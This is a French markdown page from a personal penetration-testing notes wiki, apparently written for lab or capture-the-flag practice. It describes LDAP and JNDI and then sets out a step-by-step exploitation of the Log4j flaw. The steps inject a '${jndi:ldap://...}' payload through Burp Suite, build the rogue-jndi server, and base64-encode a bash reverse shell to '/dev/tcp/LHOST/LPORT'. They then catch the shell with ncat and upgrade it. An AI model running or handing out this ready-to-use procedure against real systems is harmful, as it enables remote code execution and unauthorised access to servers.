<sub>[Procédure serveur](server_procedure.md)&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;[Cryptage](cryptage.md)&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;[Outils](tools.md)&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;[Sites utiles](useful_website.md)&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;[Lexique](lexique.md)&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;[Index](index.md)</sub>
<sub>[Retour](server_procedure.md)</sub>
#LDAP : Lightweight Directory Access Protocol

**PORT PAR DÉFAUT :** 389

**Présentation :** Process d'authentification Windows
- LDAP is the acronym for Lightweight Directory Access Protocol , which is an open, vendor-neutral,
        industry standard application protocol for accessing and maintaining distributed directory information
        services over the Internet or a Network. The default port that LDAP runs on is port 389
-  JNDI is the acronym for the Java Naming and Directory Interface API . By making calls to this API,
        applications locate resources and other program objects. A resource is a program object that provides
        connections to systems, such as database servers and messaging systems

**Procédure :**
- si faille LOG4J : interception [BurpSuite](burp_suite.md), modification du body. ex : *remember ="${jndi:ldap://{IP ATTACKER}/whatever}"*
- installer java et maven
- *git clone https://github.com/veracode-research/rogue-jndi*
- *cd rogue-jndi*
- *mvn package*
- *echo 'bash -c bash -i >&/dev/tcp/**LHOST**/**LPORT** 0>&1' | base64*
-  on garde réponse
-  java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,**BASE64 STRING HERE**}|{base64,-d}|{bash,-i}" --hostname "**LHOST**"
- on écoute avec [ncat](ncat.md)
- on relance la requête avec burpsuite => on passe dans un param la ligne maudite : *${jndi:ldap://{Your Tun0 IP}:1389/o=tomcat}*
- interception ncat => script /dev/null -c bash => et boum